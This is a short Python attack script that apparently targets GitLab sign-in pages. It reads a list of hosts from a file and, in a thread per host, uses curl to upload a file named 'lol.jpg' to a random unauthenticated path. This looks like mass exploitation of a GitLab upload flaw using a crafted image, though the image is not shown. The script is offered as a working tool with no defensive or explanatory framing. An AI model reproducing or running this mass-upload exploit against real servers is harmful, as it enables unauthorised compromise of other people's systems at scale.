import sys
import os
import threading
import time
import random
import requests

# title:"Sign In Gitlab"

def exploit(host):
  try:
    url = "http://" + host + "/" + str(random.randint(1000, 1000000))

    files = {'file': open('lol.jpg', 'rb')}

    requests.get(url, timeout=3, files=files)

  except Exception as e:
    print(str(e))
    pass

def run(host):
  try:
    os.system("curl -v -F 'file=@lol.jpg' http://" + host + "/$(openssl rand -hex 8)")
  
    print('[loading] ' + host + ' ')
  except Exception as e:
    print(str(e))
  
with open(sys.argv[1], "r") as f:
    for line in f.readlines():
        line = line.strip("\n")
        threading.Thread(target=run, args=[line,]).start()
        time.sleep(0.02)